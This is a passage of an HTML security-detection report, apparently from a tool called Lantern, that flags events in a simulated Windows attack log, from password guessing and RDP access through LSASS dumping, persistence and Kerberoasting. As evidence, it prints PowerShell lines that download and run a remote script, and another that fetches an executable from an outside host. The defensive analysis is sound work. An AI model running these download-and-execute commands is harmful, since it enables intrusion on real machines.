mono">attack_scenario.jsonl:679</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:680</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:681</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:03</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:682</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:15</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:683</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:684</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:685</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:01</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:686</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:13</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:687</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:24</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:690</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:37</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:691</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f3" data-sev="medium" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:10:22</span>
+    <span class="sev medium">Medium</span>
+    <span class="title">Repeated failed logons for one account<small>19 matching events in 10m 15s from IpAddress=203.0.113.45, TargetUserName=j.alvarez</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">The same source failed to log on as the same account many times in a short window, which suggests password guessing.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-003 (threshold)</dd><dt>When</dt><dd>2026-03-14 02:10:22 to 2026-03-14 02:20:37 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001/" target="_blank" rel="noopener">T1110.001 Brute Force: Password Guessing</a></dd><dt>Tactics</dt><dd>Credential Access</dd><dt>Could also be</dt><dd>A device or mapped drive retrying an expired password</dd></dl>
+    
+    <p class="quiet">Evidence (19 events)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:10:22</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:653</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:47</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:669</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:59</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:672</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:12</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:674</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:29</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:675</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:44</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:676</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:56</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:677</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:07</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:678</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:16</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:679</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:680</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:681</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:03</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:682</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:15</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:683</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:684</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:685</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:01</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:686</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:13</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:687</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:24</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:690</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:37</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>SubStatus=</span>0xc000006a</td><td class="nowrap mono">attack_scenario.jsonl:691</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f4" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:20:54</span>
+    <span class="sev high">High</span>
+    <span class="title">RDP logon from a public IP address<small>TargetUserName=j.alvarez, IpAddress=203.0.113.45, WorkstationName=DESKTOP-R4F9TQ1</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A Remote Desktop logon (logon type 10) came from an address outside private, loopback and link-local ranges. RDP exposed to the internet is one of the most common ransomware entry points.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-015 (match)</dd><dt>When</dt><dd>2026-03-14 02:20:54 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1133/" target="_blank" rel="noopener">T1133 External Remote Services</a>, <a href="https://attack.mitre.org/techniques/T1021/001/" target="_blank" rel="noopener">T1021.001 Remote Services: Remote Desktop Protocol</a></dd><dt>Tactics</dt><dd>Initial Access, Persistence, Lateral Movement</dd><dt>Could also be</dt><dd>Staff connecting directly from home where RDP is intentionally exposed (fix the exposure instead)</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:20:54</td><td>4624</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>TargetUserName=</span>j.alvarez<br><span>IpAddress=</span>203.0.113.45<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1<br><span>LogonType=</span>10</td><td class="nowrap mono">attack_scenario.jsonl:692</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f5" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:26:11</span>
+    <span class="sev high">High</span>
+    <span class="title">PowerShell started with an encoded command<small>User=CORP\j.alvarez, ParentImage=C:\Windows\explorer.exe, CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAu...</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">PowerShell was launched with -EncodedCommand (or one of its abbreviations) and a base64 payload. Encoding hides the real command from casual review. Lantern decodes the payload and shows it with the finding.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-005 (match)</dd><dt>When</dt><dd>2026-03-14 02:26:11 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener">T1059.001 Command and Scripting Interpreter: PowerShell</a>, <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener">T1027 Obfuscated Files or Information</a></dd><dt>Tactics</dt><dd>Execution, Defense Evasion</dd><dt>Could also be</dt><dd>Some management agents (SCCM, RMM tools) launch encoded PowerShell; baseline them by parent process</dd></dl>
+    <p class="quiet">Decoded PowerShell</p><pre class="decoded">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://198.51.100.23/stage2.ps1&#x27;)</pre>
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:26:11</td><td>1</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>User=</span>CORP\j.alvarez<br><span>ParentImage=</span>C:\Windows\explorer.exe<br><span>CommandLine=</span>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAyAC4AcA...<br><span>Image=</span>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td><td class="nowrap mono">attack_scenario.jsonl:698</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f6" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:26:13</span>
+    <span class="sev high">High</span>
+    <span class="title">Suspicious PowerShell script block<small>ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString(&#x27;http://198.51.100.23/stage2.ps1&#x27;)</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">PowerShell script block logging (event 4104) recorded code that downloads and runs content, decodes base64 at runtime, or tampers with AMSI. Script block logging records the code after it is decoded, so this catches obfuscated scripts that slip past command-line checks.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-006 (match)</dd><dt>When</dt><dd>2026-03-14 02:26:13 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener">T1059.001 Command and Scripting Interpreter: PowerShell</a>, <a href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener">T1105 Ingress Tool Transfer</a></dd><dt>Tactics</dt><dd>Execution, Command and Control</dd><dt>Could also be</dt><dd>Installer bootstrap scripts that download and run code (Chocolatey, some vendor installers)</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:26:13</td><td>4104</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>ScriptBlockText=</span>IEX (New-Object Net.WebClient).DownloadString(&#x27;http://198.51.100.23/stage2.ps1&#x27;)</td><td class="nowrap mono">attack_scenario.jsonl:699</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f7" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:26:20</span>
+    <span class="sev high">High</span>
+    <span class="title">Suspicious PowerShell script block<small>ScriptBlockText=$wc = New-Object Net.WebClient; $wc.DownloadFile(&#x27;http://198.51.100.23/svc.exe&#x27;, &#x27;C:\Us...</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">PowerShell script block logging (event 4104) recorded code that downloads and runs content, decodes base64 at runtime, or tampers with AMSI. Script block logging records the code after it is decoded, so this catches obfuscated scripts that slip past command-line checks.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-006 (match)</dd><dt>When</dt><dd>2026-03-14 02:26:20 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener">T1059.001 Command and Scripting Interpreter: PowerShell</a>, <a href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener">T1105 Ingress Tool Transfer</a></dd><dt>Tactics</dt><dd>Execution, Command and Control</dd><dt>Could also be</dt><dd>Installer bootstrap scripts that download and run code (Chocolatey, some vendor installers)</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:26:20</td><td>4104</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>ScriptBlockText=</span>$wc = New-Object Net.WebClient; $wc.DownloadFile(&#x27;http://198.51.100.23/svc.exe&#x27;, &#x27;C:\Users\Public\svc.exe&#x27;)</td><td class="nowrap mono">attack_scenario.jsonl:700</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f8" data-sev="critical" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:29:37</span>
+    <span class="sev critical">Critical</span>
+    <span class="title">Process opened LSASS memory<small>SourceImage=C:\Users\Public\svc.exe, SourceUser=CORP\j.alvarez, GrantedAccess=0x1010, CallTrace=C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Users\Public\svc.exe+1a2f3</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A process opened lsass.exe with access rights used to read its memory, which holds credentials for logged-on users. Credential dumping tools request these rights. Trusted security products are filtered by their full install path rather than their file name, so a renamed tool dropped elsewhere cannot hide behind a familiar name.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-007 (match)</dd><dt>When</dt><dd>2026-03-14 02:29:37 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank" rel="noopener">T1003.001 OS Credential Dumping: LSASS Memory</a></dd><dt>Tactics</dt><dd>Credential Access</dd><dt>Could also be</dt><dd>Other EDR or backup agents; add their install paths to a filter</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:29:37</td><td>10</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>SourceImage=</span>C:\Users\Public\svc.exe<br><span>SourceUser=</span>CORP\j.alvarez<br><span>GrantedAccess=</span>0x1010<br><span>CallTrace=</span>C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Users\Public\svc.exe+1a2f3</td><td class="nowrap mono">attack_scenario.jsonl:705</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f9" data-sev="medium" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:33:02</span>
+    <span class="sev medium">Medium</span>
+    <span class="title">Local user account created<small>TargetUserName=support_adm, SubjectUserName=j.alvarez, SubjectDomainName=CORP</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A new local account was created (event 4720). On servers and workstations that are managed centrally this is unusual and worth confirming.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-012 (match)</dd><dt>When</dt><dd>2026-03-14 02:33:02 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1136/001/" target="_blank" rel="noopener">T1136.001 Create Account: Local Account</a></dd><dt>Tactics</dt><dd>Persistence</dd><dt>Could also be</dt><dd>Imaging or provisioning scripts that create a local admin account</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:33:02</td><td>4720</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>TargetUserName=</span>support_adm<br><span>SubjectUserName=</span>j.alvarez<br><span>SubjectDomainName=</span>CORP</td><td class="nowrap mono">attack_scenario.jsonl:713</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f10" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:33:13</span>
+    <span class="sev high">High</span>
+    <span class="title">Member added to a privileged group<small>TargetUserName=Administrators, MemberSid=S-1-5-21-1004336348-1177238915-682003330-1012, SubjectUserName=j.alvarez</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">An account was added to a built-in privileged group, locally (4732) or in Active Directory (4728, 4756). Attackers grant themselves admin rights to keep access.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-010 (match)</dd><dt>When</dt><dd>2026-03-14 02:33:13 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1098/" target="_blank" rel="noopener">T1098 Account Manipulation</a></dd><dt>Tactics</dt><dd>Persistence, Privilege Escalation</dd><dt>Could also be</dt><dd>Approved access changes; confirm against the ticketing system</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:33:13</td><td>4732</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>TargetUserName=</span>Administrators<br><span>MemberSid=</span>S-1-5-21-1004336348-1177238915-682003330-1012<br><span>SubjectUserName=</span>j.alvarez</td><td class="nowrap mono">attack_scenario.jsonl:714</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f11" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:35:06</span>
+    <span class="sev high">High</span>
+    <span class="title">Service installed from a suspicious path<small>ServiceName=WinUpdateSvc, ImagePath=%COMSPEC% /c C:\Users\Public\svc.exe, AccountName=LocalSystem, StartType=auto start</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A new service (System event 7045) runs a binary from a user-writable folder or wraps a shell or script host. Attackers install services for persistence and to run code as SYSTEM.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-008 (match)</dd><dt>When</dt><dd>2026-03-14 02:35:06 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1543/003/" target="_blank" rel="noopener">T1543.003 Create or Modify System Process: Windows Service</a></dd><dt>Tactics</dt><dd>Persistence, Privilege Escalation</dd><dt>Could also be</dt><dd>Poorly packaged software that installs its service under AppData</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:35:06</td><td>7045</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>ServiceName=</span>WinUpdateSvc<br><span>ImagePath=</span>%COMSPEC% /c C:\Users\Public\svc.exe<br><span>AccountName=</span>LocalSystem<br><span>StartType=</span>auto start</td><td class="nowrap mono">attack_scenario.jsonl:715</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f12" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:36:32</span>
+    <span class="sev high">High</span>
+    <span class="title">Suspicious scheduled task created<small>TaskName=\OneDrive Standalone Update, SubjectUserName=j.alvarez, TaskContent=&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;Arguments&gt;-w hidden -f C:\Users\Public\u.ps1&lt;/A...</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A scheduled task was created (event 4698) whose action starts a shell or script host, or a binary in a user-writable folder. Built-in tasks under \Microsoft\ are excluded.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-009 (match)</dd><dt>When</dt><dd>2026-03-14 02:36:32 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank" rel="noopener">T1053.005 Scheduled Task/Job: Scheduled Task</a></dd><dt>Tactics</dt><dd>Execution, Persistence, Privilege Escalation</dd><dt>Could also be</dt><dd>IT automation that schedules PowerShell maintenance scripts</dd></dl>
+    
+    <p class="quiet">Evidence (1 event)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:36:32</td><td>4698</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>TaskName=</span>\OneDrive Standalone Update<br><span>SubjectUserName=</span>j.alvarez<br><span>TaskContent=</span>&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;Arguments&gt;-w hidden -f C:\Users\Public\u.ps1&lt;/Arguments&gt;&lt;/Exec&gt;</td><td class="nowrap mono">attack_scenario.jsonl:718</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f13" data-sev="high" data-hosts="DC01">
+  <summary>
+    <span class="when">2026-03-14 02:41:15</span>
+    <span class="sev high">High</span>
+    <span class="title">Possible Kerberoasting (many RC4 service tickets)<small>7 distinct ServiceName values in 42s from IpAddress=::ffff:10.0.20.57</small></span>
+    <span class="where">DC01</span>
+  </summary>
+  <div class="body">
+    <p class="desc">One client requested RC4-encrypted (0x17) service tickets for many different service accounts in a short time. Kerberoasting requests these tickets to crack service account passwords offline. Modern clients use AES by default, so a burst of RC4 requests stands out.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-011 (threshold)</dd><dt>When</dt><dd>2026-03-14 02:41:15 to 2026-03-14 02:41:57 UTC</dd><dt>Hosts</dt><dd>DC01.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank" rel="noopener">T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting</a></dd><dt>Tactics</dt><dd>Credential Access</dd><dt>Could also be</dt><dd>Legacy applications that only support RC4</dd></dl>
+    
+    <p class="quiet">Evidence (7 events)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
